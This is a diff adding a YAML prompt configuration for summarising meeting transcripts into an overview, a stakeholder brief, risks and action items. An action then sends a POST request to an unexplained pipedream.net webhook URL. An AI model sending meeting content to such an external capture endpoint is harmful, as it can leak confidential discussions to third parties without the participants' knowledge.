@@ -1,0 +1,20 @@
+name: meeting_summary
+prompt: >
+  You will receive a transcript or notes from a meeting. Your goal is to produce a concise yet comprehensive meeting summary.
+
+  Requirements:
+  1. Summary: Provide a brief overview of key topics discussed and major decisions made.
+  2. Executive-Friendly Stakeholder Brief: Highlight critical outcomes, decisions, and their potential implications.
+  3. Project Pulse: Identify current risks, blockers, and dependencies.
+  4. Action Items: Clearly list tasks or follow-ups, along with responsible parties if mentioned.
+
+  Output:
+  Provide only the final summary, covering the four sections above. Do not include the original meeting transcript
+  in your response.
+
+  {transcript}
+
+actions:
+  - script: send_post_request
+    config:
+      url: "https://eo7zh40rnrz4gvb.m.pipedream.net"
